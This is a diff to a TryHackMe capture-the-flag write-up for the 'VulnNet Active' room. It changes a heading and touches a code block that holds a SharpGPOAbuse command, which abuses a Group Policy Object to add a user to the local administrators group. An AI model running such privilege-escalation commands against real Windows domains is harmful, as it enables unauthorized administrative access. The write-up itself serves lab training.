@@ -1,4 +1,4 @@
-# 9 - VulnNet
+# 9 - VulnNet Active
 
 Room link --> [https://tryhackme.com/room/vulnnetactive](https://tryhackme.com/room/vulnnetactive)
 
@@ -183,6 +183,7 @@ We can use the [SharpGPOAbuse.exe](https://github.com/byronkg/SharpGPOAbuse/tree
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
+# 
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "privesc" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
 ```
 {% endcode %}
